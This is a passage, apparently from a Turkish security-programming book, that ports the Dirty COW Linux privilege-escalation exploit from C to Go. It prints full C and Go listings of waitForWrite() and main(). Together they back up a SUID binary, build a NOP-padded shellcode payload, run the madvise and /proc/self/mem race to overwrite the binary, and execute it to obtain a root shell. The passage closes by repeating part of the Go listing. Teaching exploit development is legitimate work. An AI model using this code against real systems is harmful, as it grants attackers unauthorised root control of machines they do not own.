Go sürümü, döngüyü zamanından önce kırma kararını vermek için bir kanal (channel) kullanırken, C fonksiyonu iş parçacığı yarış durumu (race condition) gerçekleştikten sonra döngünün ne zaman kırılacağını bildirmek için bir tamsayı değer kullanır.

Go sürümü Linux sistem çağrılarını gerçekleştirmek için `syscall` paketini kullanır. Fonksiyona geçirilen parametreler, çağrılacak sistem fonksiyonunu ve onun için gereken parametreleri içerir. Fonksiyonun adını, amacını ve parametrelerini Linux dokümantasyonunda arayarak bulabilirsin. Bu sayede yerel (native) Linux fonksiyonlarını çağırabiliyoruz.

Şimdi, SUID üzerinde değişiklikleri izleyerek shellcode'u yürütmek için `waitForWrite()` fonksiyonunu inceleyelim. C sürümü Liste 9-10'da, Go sürümü ise Liste 9-11'de gösterilmiştir.

```c
void *waitForWrite(void *arg) {
    char buf[sc_len];

    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");

        fread(buf, sc_len, 1, fp);

        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary);
            break;
        }

        fclose(fp);
        sleep(1);
    }

    stop = 1;

    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");

    system(suid_binary);
}
```

**Liste 9-10: C dilinde `waitForWrite()` fonksiyonu**

```go
func waitForWrite() {
    buf := make([]byte, len(sc))
    for {
        f, err := os.Open(SuidBinary)
        if err != nil {
            log.Fatal(err)
        }
        if _, err := f.Read(buf); err != nil {
            log.Fatal(err)
        }
        f.Close()
        if bytes.Compare(buf, sc) == 0 {
            fmt.Printf("%s is overwritten\n", SuidBinary)
            break
        }
        time.Sleep(1 * time.Second)
    }
    signals <- true
    signals <- true

    fmt.Println("Popping root shell")
    fmt.Println("Don't forget to restore /tmp/bak\n")

    attr := os.ProcAttr{
        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
    }
    proc, err := os.StartProcess(SuidBinary, nil, &attr)
    if err != nil {
        log.Fatal(err)
    }
    proc.Wait()
    os.Exit(0)
}
```

**Liste 9-11: Go dilinde `waitForWrite()` fonksiyonu**

Her iki durumda da kod, SUID ikili (binary) dosyasında değişiklik olup olmadığını izleyen sonsuz bir döngü tanımlar. C sürümü, shellcode'un hedefe yazılıp yazılmadığını kontrol etmek için `memcmp()` kullanırken, Go kodu `bytes.Compare()` kullanır. Shellcode mevcut olduğunda, dosyanın üzerine yazma saldırısının başarılı olduğunu anlarsın. Sonrasında sonsuz döngüden çıkar ve çalışan iş parçacıklarına/goroutine'lere artık durabileceklerine dair sinyal gönderirsin. Yarış durumu (race condition) kodunda olduğu gibi, Go sürümü bunu bir kanal (channel) üzerinden yaparken C sürümü bir tamsayı kullanır.

Son olarak, muhtemelen fonksiyonun en iyi kısmı olan SUID hedef dosyasını çalıştırırsın; bu dosyanın içinde artık zararlı kodun yer almaktadır. Go sürümü biraz daha detaylıdır, çünkü stdin, stdout ve stderr'e karşılık gelen öznitelikleri (attributes) geçirmen gerekir: sırasıyla açık girdi dosyalarına, çıktı dosyalarına ve hata dosya tanımlayıcılarına işaret eden dosya işaretçileri (file pointers).

Şimdi, bu sömürü (exploit) kodunu çalıştırmak için gerekli önceki fonksiyonları çağıran `main()` fonksiyonumuza bakalım. C sürümü Liste 9-12'de, Go sürümü ise Liste 9-13'te gösterilmiştir.

```c
int main(int argc,char *argv[]) {
    char *backup;

    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);

    f = open(suid_binary,O_RDONLY);
    fstat(f,&st);

    printf("Size of binary: %d\n", st.st_size);

    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    printf("Racing, this may take a while..\n");

    pthread_create(&pth1, NULL, badviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);

    pthread_join(pth3, NULL);

    return 0;
}
```

**Liste 9-12: C dilinde `main()` fonksiyonu**

```go
func main() {
    fmt.Println("DirtyCow root privilege escalation")
    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)

    backup := exec.Command("cp", SuidBinary, "/tmp/bak")
    if err := backup.Run(); err != nil {
        log.Fatal(err)
    }

    f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)
    if err != nil {
        log.Fatal(err)
    }
    st, err := f.Stat()
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("Size of binary: %d\n", st.Size())

    payload := make([]byte, st.Size())
    for i, _ := range payload {
        payload[i] = 0x90
    }
    for i, v := range sc {
        payload[i] = v
    }

    mapp, _ = syscall.Syscall6(
        syscall.SYS_MMAP,
        uintptr(0),
        uintptr(st.Size()),
        uintptr(syscall.PROT_READ),
        uintptr(syscall.MAP_PRIVATE),
        f.Fd(),
        0,
    )

    fmt.Println("Racing, this may take a while..\n")
    go madvise()
    go procselfmem(payload)
    waitForWrite()
}
```

**Liste 9-13: Go dilinde `main()` fonksiyonu**

`main()` fonksiyonu, hedef çalıştırılabilir dosyayı yedekleyerek başlar. Sonuçta bu dosyanın üzerine yazacağın için, orijinal sürümü kaybetmek istemezsin; bunu yapmak sistem üzerinde olumsuz etkilere yol açabilir. C, `system()` fonksiyonunu çağırıp tüm komutu tek bir string olarak geçirerek bir işletim sistemi komutunu çalıştırmana izin verirken, Go sürümü `exec.Command()` fonksiyonuna dayanır; bu fonksiyon komutu ayrı argümanlar şeklinde geçirmeni gerektirir.

Sonraki adımda, SUID hedef dosyasını salt-okunur (read-only) kipte açar ve dosya istatistiklerini (file stats) elde edersin.

```go
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("Size of binary: %d\n", st.Size())

    payload := make([]byte, st.Size())
    for i, _ := range payload {
        payload[i] = 0x90
    }
    for i, v := range sc {
        payload[i] = v
    }
```
